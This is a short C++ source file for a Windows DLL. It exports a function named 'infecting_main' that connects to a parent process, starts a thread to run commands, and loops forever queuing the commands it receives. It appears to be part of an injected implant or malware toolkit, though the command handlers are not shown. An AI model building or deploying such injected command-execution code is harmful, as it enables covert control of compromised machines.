#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#include "ipc_manage.h"
#include "commands.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void infecting_main()
{
	Sleep(1000);
	/* locals */
	HANDLE action_thread;
	u_char buffer[100];
	size_t buf_size = sizeof buffer;
	pCommand p;

	//connect to the parnet process
	connect_to_parent_process();

	action_thread = CreateThread(
		NULL,
		0,
		execute_commands,
		NULL,
		0,
		NULL
	);

	for (;;)
	{
		//wait for command from parent process
		get_command(buffer, buf_size);

		p = (pCommand)(buffer + sizeof(int));
		
		add_command(p);

		Sleep(1000);
	}
}